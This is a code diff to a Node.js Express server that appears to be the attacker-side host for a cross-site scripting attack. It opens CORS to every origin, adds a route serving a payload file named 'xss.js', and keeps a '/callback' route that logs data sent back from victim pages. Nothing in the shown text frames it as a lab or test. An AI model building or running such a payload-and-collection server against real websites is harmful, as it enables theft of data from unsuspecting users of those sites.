@@ -1,11 +1,38 @@
 const path = require('path'); // Required for file paths
 const express = require('express');
+const cors = require('cors'); // Import cors
 
+// Create express app
 const app = express();
+
+// Define CORS options
+const corsOptions = {
+	origin: '*',
+  methods: 'GET,POST',
+  allowedHeaders: 'Content-Type',
+};
+
+// Enable CORS with the specified options
+app.use(cors(corsOptions));
+
 const port = 4000;
 
+// Serve static files from the 'public' directory
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Define a route for serving the xss.js file with the correct MIME type
+app.get('/xss.js', (req, res) => {
+  // Set the Content-Type header to 'application/javascript'
+  res.setHeader('Content-Type', 'application/javascript');
+
+// Set the Content Security Policy header
+  res.setHeader('Content-Security-Policy', "default-src 'self'");
+
+	// Send the xss.js file
+  res.sendFile(path.join(__dirname, 'public', 'xss.js'));
+});
+
+// Define your existing route
 app.get('/callback', (req, res) => {
   // Collect minimal information
   const data = {
@@ -23,12 +50,11 @@ app.get('/callback', (req, res) => {
   // Report
   console.log('Data collected:', data);
 
-  // You can perform further processing here, such as logging data to a database or sending it to another service
-
   // Send response
   res.send('Data received successfully');
 });
 
+// Start the server
 app.listen(port, () => {
   console.log(`Server is running on port ${port}`);
 });
